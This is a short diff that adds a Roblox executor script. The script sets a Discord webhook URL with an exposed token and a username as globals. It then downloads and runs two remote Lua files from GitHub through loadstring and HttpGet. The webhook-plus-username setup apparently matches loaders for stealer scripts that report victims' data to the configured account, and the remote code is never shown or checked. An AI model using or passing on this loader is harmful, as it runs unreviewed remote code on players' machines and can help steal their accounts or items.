@@ -1,0 +1,4 @@
+getgenv().Webhook = "https://discord.com/api/webhooks/1381220772508602448/BSntvFH-Z6RNE04dS0wDuKb0rzjk5hVwY20o64qniDPncR1x0qGw1kmMrHehMDvReRmJ"
+getgenv().Username = "Nathan11670"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Main/refs/heads/main/main.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/loadingscreen/refs/heads/main/minigamereal.lua"))()
